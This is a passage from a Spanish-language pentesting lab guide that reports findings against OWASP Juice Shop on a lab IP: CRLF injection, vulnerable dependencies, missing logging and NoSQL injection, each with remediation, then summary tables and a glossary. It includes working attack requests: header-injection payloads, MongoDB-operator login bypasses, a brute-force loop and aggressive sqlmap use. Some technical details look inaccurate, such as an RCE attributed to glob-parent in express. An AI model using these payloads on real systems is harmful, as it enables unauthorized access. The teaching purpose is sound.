  http://192.192.168.56.101:3000/

# 5. Probar con Burp Suite
# Repeater > modificar header con %0d%0a
# Ver si hay doble respuesta HTTP
```

**Evidencia:**
```bash
# Request malicioso:
GET / HTTP/1.1
Host: 192.168.56.101:3000
X-Injected: value%0d%0aX-Injected-Two: test

# Respuesta:
HTTP/1.1 200 OK
X-Injected: value
X-Injected-Two: test
...
```

**Impacto:**
- Cross-User Defacement
- Cache Poisoning
- XSS via cache
- Redireccion de usuarios

**Remediacion:**
```javascript
// Validar y sanitizar todos los input de usuario
function sanitizeHeader(value) {
  return String(value)
    .replace(/\r/g, '')
    .replace(/\n/g, '');
}

res.setHeader('X-Custom', sanitizeHeader(req.query.value));
```

**Referencias:**
- https://owasp.org/www-community/vulnerabilities/CRLF_Injection

---

#### HALLAZGO #28 - Dependencias con Vulnerabilidades Conocidas

```
Identificador:         JS-028
Titulo:                Librerias con Vulnerabilidades Sin Parchear
Severidad:             Alto
CVSS v3.1 Score:       7.5 (Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N)
OWASP Category:        A06:2021 - Vulnerable and Outdated Components
CWE:                   CWE-1104
```

**Descripcion:**
La aplicacion utiliza componentes con vulnerabilidades conocidas sin actualizar.

**Pasos de Reproduccion:**
```bash
# 1. Verificar package.json
curl http://192.168.56.101:3000/ftp/package.json.bak

# 2. Analizar dependencias vulnerables
npm audit list /opt/juice-shop/package.json

# 3. Usar retire.js en el frontend
# En Kali:
firefox https://addons.mozilla.org/en-US/firefox/addon/retire-js/
# Navegar a la aplicacion y ver alertas

# 4. Usar Dependency-Check
dependency-check --project "Juice Shop" \
  --scan /opt/juice-shop/package.json

# 5. Buscar vulnerabilidades especificas
# Buscar version de express
curl -s http://192.168.56.101:3000/ | grep -i express
# Encontrado: Express < 4.16.0 vulnerable a ...

# 6. Verificar versiones de componentes
nmap -sV --script=banner 192.168.56.101 -p 3000
```

**Evidencia:**
```bash
$ npm audit --json | jq '.vulnerabilities | length'
5

# Vulnerabilidades encontradas:
# - express < 4.16.0: RCE via glob-parent
# - lodash < 4.17.21: Prototype Pollution
# - qs < 6.10.3: Prototype Pollution
# - node-fetch < 2.6.7: SSRF via file://
# - sanitize-html < 2.3.2: XSS en allowedTags
```

**Impacto:**
- Depende de la vulnerabilidad especifica
- Posible RCE, XSS, SSRF, etc.
- Compromiso completo del sistema

**Remediacion:**
```bash
# Actualizar dependencias regularmente
npm audit fix

# Usar versiones especificas en package.json
# "express": "4.17.3"

# Implementar gestion de dependencias
npm outdated
npm update
```

**Referencias:**
- https://owasp.org/www-project-dependency-check/

---

#### HALLAZGO #29 - Ausencia de Logeo de Eventos de Seguridad

```
Identificador:         JS-029
Titulo:                Falta de Auditoria y Logeo de Accesos
Severidad:             Medio
CVSS v3.1 Score:       5.5 (Vector: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:L/I:N/A:N)
OWASP Category:        A09:2021 - Security Logging and Monitoring Failures
CWE:                   CWE-778
```

**Descripcion:**
La aplicacion no registra eventos de seguridad criticos, dificultando la deteccion de ataques y el analisis forense.

**Pasos de Reproduccion:**
```bash
# 1. Realizar acciones suspechas y verificar logs
# Login fallido
for i in {1..10}; do
  curl -s -X POST http://192.168.56.101:3000/rest/user/login \
    -d '{"email":"admin@juice-sh.op","password":"wrong"}'
done

# 2. Verificar si hay logs de estos intentos
# Intentar acceder a logs de la aplicacion
curl http://192.168.56.101:3000/logs/application.log
curl http://192.168.56.101:3000/logs/access.log

# 3. Verificar si se loggean:
# - Intentos de login fallidos
# - Cambios de password
# - Accesos a paneles admin
# - Errores de aplicacion

# 4. Probar deteccion de ataque
# Realizar SQL injection
sqlmap -u "http://192.168.56.101:3000/rest/products/search?q=test" \
  --batch --level=5 --risk=3

# 5. Verificar si hay alertas o logs
# Si no hay logs, el ataque pasa desapercibido
```

**Evidencia:**
```bash
# Intentar acceder a logs
$ curl http://192.168.56.101:3000/logs/application.log
404 Not Found

# No hay logs de seguridad visibles
# Los intentos de login fallidos no generan alertas
# Las acciones de admin no se audititan
```

**Impacto:**
- Incapacidad de detectar ataques en tiempo real
- Dificultad para investigacion forense
- No hay evidencia de compromiso
- Violacion de regulaciones (PCI-DSS, HIPAA)

**Remediacion:**
```javascript
// Implementar logging de seguridad
const winston = require('winston');
const auditLogger = winston.createLogger({
  level: 'info',
  format: winston.format.combine(
    winston.format.timestamp(),
    winston.format.json()
  ),
  transports: [
    new winston.transports.File({ 
      filename: 'logs/security-audit.log' 
    })
  ]
});

// Loggear eventos criticos
app.post('/login', (req, res) => {
  // ... verificacion de credenciales ...
  
  if (loginFailed) {
    auditLogger.warn('Login failed', {
      ip: req.ip,
      email: req.body.email,
      attempts: loginAttempts
    });
  }
  
  if (loginSucceeded) {
    auditLogger.info('Login success', {
      userId: user.id,
      email: user.email,
      ip: req.ip
    });
  }
});
```

**Referencias:**
- https://owasp.org/www-project-application-security-verification-standard/

---

#### HALLAZGO #30 - Vulnerabilidad de Inyeccion NoSQL (MongoDB)

```
Identificador:         JS-030
Titulo:                Inyeccion NoSQL en Query de Autenticacion
Severidad:             Critico
CVSS v3.1 Score:       9.1 (Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
OWASP Category:        A03:2021 - Injection
CWE:                   CWE-943
```

**Descripcion:**
La aplicacion es vulnerable a inyeccion NoSQL en consultas de MongoDB, permitiendo autenticacion sin credenciales validas.

**Pasos de Reproduccion:**
```bash
# 1. Identificar que usa MongoDB
# Verificar en configuracion o responses
curl http://192.168.56.101:3000/rest/products/search?q=test | grep -i mongo
# o buscar en codigo fuente

# 2. Intentar inyeccion basica
curl -X POST http://192.168.56.101:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":{"$gt":""},"password":"any"}'

# 3. Probar diferentes operadores MongoDB
# $ne (not equal)
curl -X POST http://192.168.56.101:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":{"$ne":null},"password":{"$ne":null}}'

# $regex
curl -X POST http://192.168.56.101:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":{"$regex":".*"},"password":"test"}'

# 4. Extraer datos usando $exists
curl -X POST http://192.168.56.101:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":{"$gt":""},"password":{"$gt":""}}'

# 5. Con sqlmap para NoSQL (nuclei o similar)
# Usar NoSQLMap
git clone https://github.com/codingo/NoSQLMap.git
cd NoSQLMap
python nosqlmap.py

# 6. Probar en busqueda de productos
curl "http://192.168.56.101:3000/rest/products/search?q[price][$gt]=0"
```

**Evidencia:**
```bash
# Login exitoso sin credenciales validas:
$ curl -X POST http://192.168.56.101:3000/rest/user/login \
  -d '{"email":{"$ne":null},"password":{"$ne":null}}'

{
  "token": "eyJhbGciOi...",
  "user": {
    "id": 1,
    "email": "admin@juice-sh.op",
    "role": "admin"
  }
}
```

**Impacto:**
- Acceso como administrador sin credenciales
- Extraccion de todos los usuarios
- Compromiso completo de la aplicacion
- Acceso a datos sensibles

**Remediacion:**
```javascript
// Usar consultas parametrizadas en MongoDB
// NO interpolar strings en queries

// Incorrecto (vulnerable):
const user = await db.collection('users').find({
  email: req.body.email,
  password: req.body.password
});

// Correcto (validacion):
function sanitizeMongoQuery(input) {
  if (typeof input === 'object' && input !== null) {
    // Rechazar si es un objeto con operadores
    const dangerousKeys = ['$gt', '$lt', '$ne', '$regex', '$exists', '$where'];
    for (const key of dangerousKeys) {
      if (key in input) {
        throw new Error('Invalid query operator');
      }
    }
  }
  return input;
}

const user = await db.collection('users').findOne({
  email: sanitizeMongoQuery(req.body.email),
  passwordHash: await hash(req.body.password)
});
```

**Referencias:**
- https://www.mongodb.com/docs/manual/security/

---

### 14.3. Resumen de Hallazgos

| ID | Titulo | Severidad | CVSS | OWASP Category |
|----|--------|-----------|------|----------------|
| JS-001 | Accion Restringida sin Autorizacion | Alto | 7.1 | A01:2021 |
| JS-002 | Credenciales Debiles Admin | Critico | 9.8 | A07:2021 |
| JS-003 | Inyeccion SQL | Critico | 9.8 | A03:2021 |
| JS-004 | XSS Reflejado | Alto | 7.5 | A03:2021 |
| JS-005 | Path Traversal | Alto | 7.5 | A01:2021 |
| JS-006 | Archivos de Configuracion Expuestos | Critico | 8.2 | A01:2021 |
| JS-007 | Session Fixation | Medio | 6.1 | A07:2021 |
| JS-008 | Password Reset Inseguro | Alto | 8.2 | A07:2021 |
| JS-009 | JWT Alg None | Critico | 9.1 | A07:2021 |
| JS-010 | XXE Injection | Critico | 9.8 | A05:2021 |
| JS-011 | Command Injection | Critico | 9.8 | A03:2021 |
| JS-012 | CSRF | Medio | 6.5 | A01:2021 |
| JS-013 | Password Hashing Debil | Alto | 7.5 | A02:2021 |
| JS-014 | Falta Rate Limiting | Alto | 7.5 | A07:2021 |
| JS-015 | Headers de Seguridad Faltantes | Medio | 5.3 | A05:2021 |
| JS-016 | DoS en Busqueda | Medio | 6.5 | A05:2021 |
| JS-017 | DOM XSS | Alto | 7.1 | A03:2021 |
| JS-018 | Sin HTTPS | Alto | 7.4 | A02:2021 |
| JS-019 | Homoglyph Attack | Medio | 5.3 | A07:2021 |
| JS-020 | Log Injection | Medio | 6.1 | A03:2021 |
| JS-021 | IDOR | Alto | 7.1 | A01:2021 |
| JS-022 | Stored XSS | Alto | 8.1 | A03:2021 |
| JS-023 | Price Manipulation | Critico | 8.1 | A08:2021 |
| JS-024 | User Enumeration | Bajo | 4.3 | A07:2021 |
| JS-025 | Mass Assignment | Medio | 6.5 | A01:2021 |
| JS-026 | SSRF | Alto | 8.6 | A10:2021 |
| JS-027 | CRLF Injection | Medio | 6.5 | A03:2021 |
| JS-028 | Vulnerable Dependencies | Alto | 7.5 | A06:2021 |
| JS-029 | Falta Logging/Auditoria | Medio | 5.5 | A09:2021 |
| JS-030 | NoSQL Injection | Critico | 9.1 | A03:2021 |

**Distribucion por Severidad:**

| Severidad | Cantidad | % del Total |
|-----------|----------|-------------|
| Critico | 7 | 23.3% |
| Alto | 13 | 43.3% |
| Medio | 9 | 30.0% |
| Bajo | 1 | 3.3% |

---

### 14.4. Matriz de Priorizacion de Remediacion

| Prioridad | Vulnerabilidades | Tiempo de Remediacion |
|-----------|------------------|----------------------|
| **P1 - Critico** | JS-002, JS-003, JS-006, JS-009, JS-010, JS-011, JS-023, JS-030 | Inmediato (<24h) |
| **P2 - Alto** | JS-001, JS-004, JS-005, JS-008, JS-013, JS-014, JS-017, JS-018, JS-021, JS-022, JS-026, JS-028 | 1 semana |
| **P3 - Medio** | JS-007, JS-012, JS-015, JS-016, JS-019, JS-020, JS-025, JS-027, JS-029 | 1 mes |
| **P4 - Bajo** | JS-024 | 3 meses |

---

## 14. Glosario Rapido

| Termino | Definicion |
|---------|------------|
| **VM** | Maquina Virtual - Sistema operativo emulado via software |
| **Hipervisor** | Software que crea y gestiona VMs |
| **NAT** | Traduccion de direcciones de red para compartir internet |
| **Bridged** | Modo donde la VM se conecta directamente a la red fisica |
| **Host-Only** | Red privada solo entre host y VMs |
| **Shell** | Interfaz de linea de comandos |
| **Payload** | Codigo que se ejecuta tras la explotacion exitosa |
| **Exploit** | Codigo/software que aprovecha una vulnerabilidad |
| **Vulnerability** | Debilidad en un sistema que puede ser explotada |
| **PoC** | Prueba de concepto - Demostracion de vulnerabilidad |
| **CVSS** | Common Vulnerability Scoring System - Puntuacion de severidad |
| **Meterpreter** | Payload avanzado para post-explotacion en Metasploit |
| **CTF** | Capture The Flag - Competencia de hacking |
| **IDS** | Sistema de Deteccion de Intrusos |
| **IPS** | Sistema de Prevencion de Intrusos |
| **WAF** | Web Application Firewall |
| **OWASP** | Open Web Application Security Project |

---

Este documento proporciona una base solida para comenzar tu laboratorio de pentesting. Practica cada seccion, experimenta con las herramientas y siempre trabaja dentro de entornos controlados y con autorizacion.
